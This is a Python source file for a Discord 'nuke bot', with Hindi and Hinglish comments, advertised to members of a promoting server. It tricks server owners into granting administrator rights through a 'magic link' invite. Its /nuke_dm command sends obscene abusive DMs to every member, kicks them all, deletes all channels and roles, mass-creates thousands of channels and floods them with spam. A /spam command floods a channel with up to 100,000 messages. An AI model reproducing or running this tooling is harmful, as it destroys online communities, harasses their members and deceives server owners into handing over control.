import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
import aiohttp

load_dotenv()

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.dm_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

CLIENT_ID = os.getenv("CLIENT_ID", "1469213868323504261")
ALLOWED_GUILD_ID = 1322848585702838302  # https://discord.gg/4Gm7kuTh server ID

@bot.event
async def on_ready():
    print(f"✅ Bot logged in as {bot.user}")
    try:
        await bot.tree.sync()
        print("✅ Commands synced!")
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")

@bot.event
async def on_guild_join(guild):
    """Bot ko naya server join karta hai toh welcome message bhejo"""
    print(f"✅ Bot added to server: {guild.name} (ID: {guild.id})")
    
    try:
        # Bot ke pehle text channel mein message bhejo
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                embed = discord.Embed(
                    title="🔥 NUKE BOT ACTIVE 🔥",
                    description="Bot successfully added!\n\n**⚠️ इस bot को use करने के लिए पहले join करो:**\n👇👇👇",
                    color=discord.Color.red()
                )
                embed.add_field(
                    name="🔗 Join करो:",
                    value="[Click Here to Join]( https://discord.gg/4Gm7kuTh)",
                    inline=False
                )
                embed.add_field(
                    name="📖 Commands:",
                    value="`/spam count: <COUNT> message: <MESSAGE>`\n`/link server_id: <SERVER_ID>`\n`/nuke_dm server_id: <SERVER_ID>`",
                    inline=False
                )
                embed.add_field(
                    name="🔥 Usage:",
                    value="Join करने के बाद DM में यह commands भेजो!",
                    inline=False
                )
                await channel.send(embed=embed)
                break
    except Exception as e:
        print(f"⚠️ Could not send join message: {e}")

# Check if user is member of allowed guild
async def is_allowed_member(user_id: int) -> bool:
    """Check if user is member of allowed guild"""
    try:
        guild = bot.get_guild(ALLOWED_GUILD_ID)
        if guild is None:
            print(f"⚠️ Allowed guild not found: {ALLOWED_GUILD_ID}")
            return False
        
        member = guild.get_member(user_id)
        if member is not None:
            return True
        return False
    except Exception as e:
        print(f"⚠️ Error checking membership: {e}")
        return False

# Aggressive DM messages for kicked members
DM_MESSAGES = [
    "@everyone apke server ki maa chud gyi gand marai bosdiwale or server indo dedo",
    "@everyone 💀🔥💥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💥🔥💀\n🚨🚨🚨 APKE SERVER KI CHUT GYI 🚨🚨🚨\n🔥💀 SERVER STATUS : ☠️ KHATAM ☠️ 💀🔥\n💣⚠️ SYSTEM STATUS : 💥 CRASHED 💥 ⚠️💣\n🧨☠️ SERVER HEALTH : 📉 0% 📉 ☠️🧨\n💥🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💥\n☠️ REST IN PEACE SERVER ☠️\n💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"
]

# Channel names
CHANNEL_NAMES = [
    "💥 SERVER UD GYA 💀",
    "🚨 SERVER CRASH 🧨",
    "🔥 SERVER KHATAM ☠️",
    "💣 SERVER GONE 💀",
    "⚠️ SERVER DOWN 🫠",
    "🧨 SERVER PHAT GYA 💥",
    "☠️ SERVER DEAD 🪦",
    "🌪️ SERVER UDD GYA 💀",
    "🛑 SERVER BAND 🚫",
    "⚡ SERVER CRASHED 💥",
    "🪦 SERVER RIP ☠️",
    "🌋 SERVER JAL GYA 🔥",
    "💀 SERVER KHALLAS 🫠",
    "🚧 SERVER DAMAGE 💥",
    "🧯 SERVER FIRE 🔥",
    "🌀 SERVER GAYAB 👻",
    "👻 SERVER BHOOT BAN GYA 💀",
    "📉 SERVER DOWN BAD 😭",
    "🔌 SERVER OFF ⚫",
    "☠️ SERVER FINISH 💥"
]

# Role names
ROLE_NAMES = [
    "💥 SERVER UD GYA 💀",
    "🚨 SERVER CRASH 🧨",
    "🔥 SERVER KHATAM ☠️",
    "💣 SERVER GONE 💀",
    "⚠️ SERVER DOWN 🫠",
    "🧨 SERVER PHAT GYA 💥",
    "☠️ SERVER DEAD 🪦",
    "🌪️ SERVER UDD GYA 💀",
    "🛑 SERVER BAND 🚫",
    "⚡ SERVER CRASHED 💥",
    "🪦 SERVER RIP ☠️",
    "🌋 SERVER JAL GYA 🔥",
    "💀 SERVER KHALLAS 🫠",
    "🚧 SERVER DAMAGE 💥",
    "🧯 SERVER FIRE 🔥",
    "🌀 SERVER GAYAB 👻",
    "👻 SERVER BHOOT BAN GYA 💀",
    "📉 SERVER DOWN BAD 😭",
    "🔌 SERVER OFF ⚫",
    "☠️ SERVER FINISH 💥",
    "🔥💀 NUKE TIME 💀🔥",
    "💥⚡ CHAOS MODE ⚡💥",
    "🌪️🔥 DESTRUCTION 🔥🌪️",
    "☠️💀 DEATH COMES 💀☠️",
    "🚀🔥 EXPLOSION 🔥🚀",
    "💣⚠️ BOOM TIME ⚠️💣",
    "🧨🌋 KABOOM 🌋🧨",
    "📉💀 CRASH ZONE 💀📉",
    "🫠🔌 SHUTDOWN 🔌🫠",
    "👻🌀 GHOSTED 🌀👻",
    "🪦☠️ GRAVEYARD ☠️🪦",
    "🔥🚨 ALERT 🚨🔥",
    "💥🛑 STOP IT 🛑💥",
    "⚡🌋 ERUPTION 🌋⚡",
    "🧯💣 EXTINGUISH 💣🧯",
    "📉🫠 MELTING 🫠📉",
    "🌀👻 VANISH 👻🌀",
    "💀🔥 INFERNO 🔥💀",
    "☠️💥 OBLITERATE 💥☠️",
    "🚀⚡ LIGHTNING 🚀⚡",
    "🧨🔥 DYNAMITE 🔥🧨",
    "🌪️💀 TORNADO 💀🌪️",
    "🎆💥 FIREWORKS 💥🎆",
    "🌋☠️ VOLCANO ☠️🌋",
    "💣🔥 EXPLOSION 🔥💣",
    "⚠️💀 WARNING 💀⚠️",
    "🔌📉 POWERDOWN 📉🔌",
    "👻🫠 DISSOLVE 🫠👻",
    "🪦💀 BURIED 💀🪦",
    "🔥💥 INFERNO 💥🔥",
    "☠️🚨 SIREN 🚨☠️",
    "🛑⚡ BLOCKED ⚡🛑",
    "🌋💣 MAGMA 💣🌋",
    "🧯🔥 EXTINGUISH 🔥🧯",
    "💀📉 COLLAPSE 📉💀",
    "🌀👻 GHOST 👻🌀",
    "💥🔥 NUCLEAR 🔥💥",
    "⚡🚀 ROCKET 🚀⚡",
    "🧨💀 BOMB 💀🧨",
    "🌪️☠️ WIND 🌪️☠️",
    "🎆💣 BOOM 💣🎆",
    "🌋🔥 HOT 🔥🌋",
    "⚠️💥 CAUTION 💥⚠️",
    "🔌💀 DEAD 💀🔌",
    "👻📉 FADE 📉👻",
    "🪦🔥 TOMB 🔥🪦",
    "🔥☠️ SCYTHE ☠️🔥",
    "💥⚡ ZAPPED ⚡💥",
    "🧨🌀 SPIN 🌀🧨",
    "💀🛑 STOP 🛑💀",
    "🌋💥 ERUPT 💥🌋",
    "🧯☠️ COOL 🧯☠️",
    "📉🫠 SINK 🫠📉",
    "🌀💀 SWIRL 💀🌀",
    "🚀💣 LAUNCH 💣🚀",
    "⚡🔥 SHOCK 🔥⚡",
    "🧨☠️ TNT ☠️🧨",
    "🌪️💥 WIND 💥🌪️",
    "🎆🔥 FLASH 🔥🎆",
    "🌋🧨 LAVA 🧨🌋",
    "⚠️☠️ ALERT ☠️⚠️",
    "🔌💥 SURGE 💥🔌",
    "👻🫠 MELT 🫠👻",
    "🪦💀 DEATH 💀🪦",
    "🔥💀 FIRE 💀🔥",
    "💥☠️ BLAST ☠️💥",
    "⚡🌀 TWIRL 🌀⚡",
    "🧨🔥 EXPLOSIVE 🔥🧨"
]

SPAM_MESSAGE = """💀🔥💥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💥🔥💀

        🚨🚨🚨  APKE SERVER KI CHUT GYI  🚨🚨🚨

🔥💀  SERVER STATUS : ☠️ KHATAM ☠️  💀🔥
💣⚠️  SYSTEM STATUS : 💥 CRASHED 💥  ⚠️💣
🧨☠️  SERVER HEALTH : 📉 0% 📉  ☠️🧨

💥🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💥
        ☠️  REST IN PEACE SERVER  ☠️
💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"""

# SPAM COMMAND - Channel mein custom message spam karenge
@bot.tree.command(name="spam", description="💬 Channel में message spam करो!")
@discord.app_commands.describe(
    count="1 से 100000 तक message spam कर सकते हो",
    message="जो message spam करना है (optional - default: numbers)"
)
async def spam(interaction: discord.Interaction, count: int, message: str = None):
    """Channel mein custom message ko spam karo"""
    
    # Check if user is allowed
    is_allowed = await is_allowed_member(interaction.user.id)
    if not is_allowed:
        embed = discord.Embed(
            title="❌ ACCESS DENIED!",
            description="**इस bot को use करने के लिए पहले server में join करो!**",
            color=discord.Color.red()
        )
        embed.add_field(
            name="🔗 Join Server:",
            value="[Click Here - https://discord.gg/4Gm7kuTh](https://discord.gg/4Gm7kuTh)",
            inline=False
        )
        embed.add_field(
            name="⏳ Process:",
            value="1️⃣ Link पर click करो\n2️⃣ Server join करो\n3️⃣ फिर से command दो",
            inline=False
        )
        
        try:
            await interaction.user.send(embed=embed)
            await interaction.response.send_message("❌ Access Denied! Check your DM for details!", ephemeral=True)
        except:
            await interaction.response.send_message(embed=embed, ephemeral=True)
        
        print(f"❌ Unauthorized user {interaction.user.name} tried to use /spam")
        return
    
    await interaction.response.defer()
    
    # Validate count
    if count < 1:
        await interaction.followup.send("❌ Count कम से कम 1 होना चाहिए!", ephemeral=True)
        return
    
    if count > 100000:
        await interaction.followup.send("❌ Count maximum 100000 हो सकता है!", ephemeral=True)
        return
    
    channel = interaction.channel
    
    # Default message if not provided
    if message is None:
        message = "number"  # Will send 1, 2, 3, ... format
    
    try:
        await interaction.followup.send(f"🚀 **SPAM शुरू!**\n💬 {count} messages भेजेंगे... बिना gap के!\n📝 Message: `{message}`\n⏳ यह थोड़ा समय ले सकता है!", ephemeral=True)
        print(f"🚀 SPAM शुरू: {count} messages with message: {message}")
        
        spam_count = 0
        
        for i in range(1, count + 1):
            try:
                # If message is "number", send sequential numbers
                if message.lower() == "number":
                    await channel.send(f"{i}")
                else:
                    # Otherwise send the custom message
                    await channel.send(message)
                
                spam_count += 1
                
                if spam_count % 100 == 0:
                    print(f"✅ {spam_count}/{count} messages sent")
                
                # No delay - maximum speed!
                
            except discord.Forbidden:
                await interaction.followup.send(f"❌ Bot को इस channel में message भेजने की permission नहीं है!", ephemeral=True)
                print(f"⚠️ Forbidden error")
                break
            except discord.HTTPException as e:
                if "You are being rate limited" in str(e):
                    print(f"⏳ Rate limited! Waiting...")
                    await asyncio.sleep(5)
                    try:
                        if message.lower() == "number":
                            await channel.send(f"{i}")
                        else:
                            await channel.send(message)
                        spam_count += 1
                    except:
                        break
                else:
                    break
            except Exception as e:
                print(f"⚠️ Error at message {i}: {e}")
                break
        
        await interaction.followup.send(f"✅ **SPAM COMPLETE!**\n💬 Total {spam_count} messages sent!\n📝 Message: `{message}`\n🎉 वो भी बिना gap के!", ephemeral=True)
        print(f"✅ SPAM COMPLETE: {spam_count} messages sent!")
        
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
        print(f"❌ Error: {e}")

# LINK COMMAND - Server ID se Magic Link generate karo
@bot.tree.command(name="link", description="🔗 Magic Link generate करो!")
@discord.app_commands.describe(server_id="जिस server को nuke करना है उसकी ID")
async def link(interaction: discord.Interaction, server_id: str):
    """Server ID se Magic Link generate karo"""
    
    # Check if user is allowed
    is_allowed = await is_allowed_member(interaction.user.id)
    if not is_allowed:
        embed = discord.Embed(
            title="❌ ACCESS DENIED!",
            description="**इस bot को use करने के लिए पहले server में join करो!**",
            color=discord.Color.red()
        )
        embed.add_field(
            name="🔗 Join Server:",
            value="[Click Here - https://discord.gg/4Gm7kuTh](https://discord.gg/4Gm7kuTh)",
            inline=False
        )
        embed.add_field(
            name="⏳ Process:",
            value="1️⃣ Link पर click करो\n2️⃣ Server join करो\n3️⃣ फिर से command दो",
            inline=False
        )
        
        try:
            await interaction.user.send(embed=embed)
            await interaction.response.send_message("❌ Access Denied! Check your DM for details!", ephemeral=True)
        except:
            await interaction.response.send_message(embed=embed, ephemeral=True)
        
        print(f"❌ Unauthorized user {interaction.user.name} tried to use /link")
        return
    
    await interaction.response.defer(ephemeral=True)
    
    try:
        # Server ID ko validate karo
        guild_id = int(server_id)
        
        # Magic Link generate karo
        invite_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&permissions=8&scope=bot%20applications.commands&guild_id={guild_id}"
        
        embed = discord.Embed(
            title="🔗 MAGIC LINK GENERATED!",
            description=f"**Server ID:** `{guild_id}`\n\n**यह link owner को दो:**\n👇👇👇",
            color=discord.Color.red()
        )
        embed.add_field(
            name="✅ क्या होगा:",
            value="Link पर click करेंगे तो bot automatically server में add हो जाएगा!",
            inline=False
        )
        embed.add_field(
            name="🔥 फिर करो:",
            value="`/nuke_dm server_id: " + str(guild_id) + "` command use करो!",
            inline=False
        )
        
        class LinkView(discord.ui.View):
            @discord.ui.button(
                label="🔗 MAGIC LINK",
                style=discord.ButtonStyle.red,
                emoji="✨"
            )
            async def link_button(self, inter: discord.Interaction, button: discord.ui.Button):
                await inter.response.send_message(
                    f"🔗 **[यहाँ Click करके Bot को Add करो!]({invite_url})**\n\n✅ Bot add होने के बाद `/nuke_dm server_id: {guild_id}` command use कर सकते हो!",
                    ephemeral=True
                )
        
        await interaction.followup.send(embed=embed, view=LinkView(), ephemeral=True)
        
        # DM mein bhi link bhej do
        try:
            user = interaction.user
            await user.send(f"🔗 **Magic Link:**\n{invite_url}\n\n**Server ID:** `{guild_id}`\n\n✅ इस link को server owner को दो, click करेंगे तो bot add हो जाएगा!")
        except:
            pass
        
    except ValueError:
        await interaction.followup.send(f"❌ Invalid Server ID!\n\n**सही से Server ID दो**\n\nExample: `/link server_id: 123456789`", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)

# DM NUKE COMMAND - DM se server ko nuke karo
@bot.tree.command(name="nuke_dm", description="💥 DM से किसी भी server को NUKE करो!")
@discord.app_commands.describe(server_id="जिस server को nuke करना है उसकी ID दो")
async def nuke_dm(interaction: discord.Interaction, server_id: str):
    """DM se kisi bhi server ko nuke kar do!"""
    
    # Check if user is allowed
    is_allowed = await is_allowed_member(interaction.user.id)
    if not is_allowed:
        embed = discord.Embed(
            title="❌ ACCESS DENIED!",
            description="**इस bot को use करने के लिए पहले server में join करो!**",
            color=discord.Color.red()
        )
        embed.add_field(
            name="🔗 Join Server:",
            value="[Click Here - https://discord.gg/4Gm7kuTh](https://discord.gg/4Gm7kuTh)",
            inline=False
        )
        embed.add_field(
            name="⏳ Process:",
            value="1️⃣ Link पर click करो\n2️⃣ Server join करो\n3️⃣ फिर से command दो",
            inline=False
        )
        
        try:
            await interaction.user.send(embed=embed)
            await interaction.response.send_message("❌ Access Denied! Check your DM for details!", ephemeral=True)
        except:
            await interaction.response.send_message(embed=embed, ephemeral=True)
        
        print(f"❌ Unauthorized user {interaction.user.name} tried to use /nuke_dm")
        return
    
    await interaction.response.defer(ephemeral=True)
    
    try:
        # Server ID ko convert karo
        guild_id = int(server_id)
        guild = bot.get_guild(guild_id)
        
        if not guild:
            await interaction.followup.send(f"❌ Bot उस server में नहीं है!\n\nServer ID: `{server_id}`\n\n**पहले bot को add करो:**\n`/link server_id: {server_id}` command use करो!", ephemeral=True)
            return
        
        # Check karo ki bot ke paas admin permission hai ya nahi
        if not guild.me.guild_permissions.administrator:
            await interaction.followup.send("❌ Bot को इस server में Admin permission नहीं है!\n\n**Bot को फिर से add करो admin permission के साथ!**", ephemeral=True)
            return
        
        await interaction.followup.send(f"🔥 **NUKE शुरू हो गया!**\n🎯 Target Server: **{guild.name}**\n💀 SERVER UD JAYEGA!", ephemeral=True)
        print(f"🔥 NUKE शुरू: {guild.name} (ID: {guild_id})")
        
        # Phase 1: Send DMs to members before kicking
        print("🔥 PHASE 1: SENDING DM MESSAGES...")
        members_to_kick = [m for m in guild.members if not m.bot]
        
        for member in members_to_kick:
            try:
                dm_message = DM_MESSAGES[0]
                await member.send(dm_message)
                print(f"📧 DM sent to: {member.name}")
            except Exception as e:
                print(f"⚠️ Could not DM {member.name}: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 2: Kick all members
        print("🔥 PHASE 2: KICKING ALL MEMBERS...")
        for member in members_to_kick:
            try:
                await member.kick(reason="SERVER NUKED 💥")
                print(f"👢 KICKED: {member.name}")
            except Exception as e:
                print(f"⚠️ Could not kick {member.name}: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 3: Delete ALL channels
        print("🔥 PHASE 3: DELETING ALL CHANNELS...")
        for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"💥 DESTROYED: {channel.name}")
            except Exception as e:
                print(f"⚠️ Error: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 4: Delete ALL roles except @everyone
        print("🔥 PHASE 4: DELETING ALL ROLES...")
        for role in list(guild.roles):
            if role.name != "@everyone":
                try:
                    await role.delete()
                    print(f"💥 DESTROYED ROLE: {role.name}")
                except Exception as e:
                    print(f"⚠️ Error: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 5: Create new roles (99)
        print("🔥 PHASE 5: CREATING NEW ROLES...")
        roles_created = 0
        for i, role_name in enumerate(ROLE_NAMES[:99]):
            try:
                await guild.create_role(name=role_name, color=discord.Color.random())
                roles_created += 1
                print(f"🎭 Created role {i+1}: {role_name}")
            except Exception as e:
                print(f"⚠️ Error creating role: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 6A: Create ALL 9999 channels FIRST
        print("🔥 PHASE 6A: CREATING ALL 9999 CHANNELS (NO SPAM YET)...")
        all_channels = []
        channel_count = 0
        
        for i in range(9999):
            try:
                channel_name = CHANNEL_NAMES[i % len(CHANNEL_NAMES)] + f" [{i+1}]"
                channel = await guild.create_text_channel(channel_name)
                all_channels.append(channel)
                channel_count += 1
                
                print(f"💥 Created channel {i+1}/9999: {channel_name}")
                
                # Small delay to avoid rate limiting during creation
                if i % 50 == 0 and i > 0:
                    await asyncio.sleep(2)
                else:
                    await asyncio.sleep(0.05)
                    
            except discord.Forbidden:
                print(f"⚠️ Cannot create more channels - reached Discord limit at {i+1}")
                break
            except Exception as e:
                print(f"⚠️ Error at channel {i+1}: {e}")
                if "You are being rate limited" in str(e):
                    print("⏳ Rate limited! Waiting 60 seconds...")
                    await asyncio.sleep(60)
        
        print(f"✅ ALL {channel_count} CHANNELS CREATED! NOW STARTING SPAM...")
        
        # Phase 6B: SPAM in ALL channels (999 times each)
        print(f"🔥 PHASE 6B: SPAMMING IN ALL {channel_count} CHANNELS (999 TIMES EACH)...")
        
        for spam_round in range(999):
            print(f"💬 SPAM ROUND {spam_round + 1}/999 - SENDING TO ALL {channel_count} CHANNELS...")
            
            tasks = []
            for channel in all_channels:
                try:
                    task = channel.send(SPAM_MESSAGE)
                    tasks.append(task)
                except Exception as e:
                    print(f"⚠️ Error queueing message to {channel.name}: {e}")
            
            # Send all messages concurrently
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except Exception as e:
                if "You are being rate limited" in str(e):
                    print("⏳ Rate limited! Waiting 10 seconds...")
                    await asyncio.sleep(10)
            
            print(f"✅ SPAM ROUND {spam_round + 1}/999 COMPLETE")
            await asyncio.sleep(0.5)
        
        # Phase 7: Change server name and avatar
        print("🔥 PHASE 7: CHANGING SERVER NAME & AVATAR...")
        try:
            await guild.edit(name="Nuke server")
            print("✅ Server name changed to 'Nuke server'")
            
            # Download and set avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get("https://share.google/shrccJdJSDeMUmsA5") as resp:
                        if resp.status == 200:
                            avatar_data = await resp.read()
                            await guild.edit(icon=avatar_data)
                            print("✅ Server avatar changed")
            except Exception as e:
                print(f"⚠️ Could not change avatar: {e}")
        except Exception as e:
            print(f"⚠️ Error changing server: {e}")
        
        # Final message
        await interaction.followup.send(f"✅ **NUKE COMPLETE!** 💥🔥\n🎯 Server: **{guild.name}**\n📊 Channels Created: **{channel_count}**\n💬 Spam Rounds: **999**\n🎭 Roles Created: **{roles_created}**\n💀 **SERVER UD GYA!**", ephemeral=True)
        print("✅ NUKE SUCCESSFUL!")
        
    except ValueError:
        await interaction.followup.send(f"❌ Invalid Server ID!\n\n**सही से Server ID दो**\n\nExample: `/nuke_dm server_id: 123456789`", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("❌ Bot को Admin permission नहीं है!", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
        print(f"❌ Error: {e}")

# Run bot
TOKEN = os.getenv("DISCORD_TOKEN")
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ DISCORD_TOKEN not found in .env file!")
